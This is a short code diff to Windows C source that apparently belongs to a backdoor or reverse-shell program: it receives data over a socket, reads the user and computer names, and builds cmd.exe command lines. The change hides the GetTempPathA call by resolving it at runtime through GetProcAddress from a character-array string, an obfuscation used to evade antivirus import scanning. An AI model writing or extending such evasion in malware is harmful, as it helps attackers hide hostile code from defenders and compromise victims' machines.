@@ -18,6 +18,7 @@ typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
 typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
 typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
+typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
 
 #define SOCKET_BUFFER_SIZE 256
 #define SPLIT_STRING_ARRAY_SIZE 16
@@ -283,7 +284,10 @@ WinMain(HINSTANCE hInstance,
 			strncat_s(cmdPath, ca_cmdexe, 8);
 
 			char tempPath[MAX_PATH];
-			GetTempPathA(MAX_PATH, tempPath);
+
+			char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
+			_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(libraryKernel32, ca_GetTempPathA);
+			f_GetTempPathA(MAX_PATH, tempPath);
 
 			char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };
 
